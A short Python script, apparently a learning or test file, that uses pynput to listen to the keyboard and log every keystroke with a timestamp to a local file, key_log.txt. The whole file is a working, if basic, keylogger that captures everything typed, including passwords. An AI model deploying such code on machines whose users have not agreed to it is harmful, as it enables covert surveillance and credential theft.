from pynput import keyboard
import logging
print("pynput is working with Python 3.11!")

# Configure the logging location and format
log_file = "key_log.txt"
logging.basicConfig(filename=log_file, level=logging.DEBUG, format='%(asctime)s: %(message)s')

# Define what to do when a key is pressed
def on_press(key):
    try:
        logging.info(f"Key pressed: {key.char}")
    except AttributeError:
        logging.info(f"Special key pressed: {key}")

# Set up the listener
with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
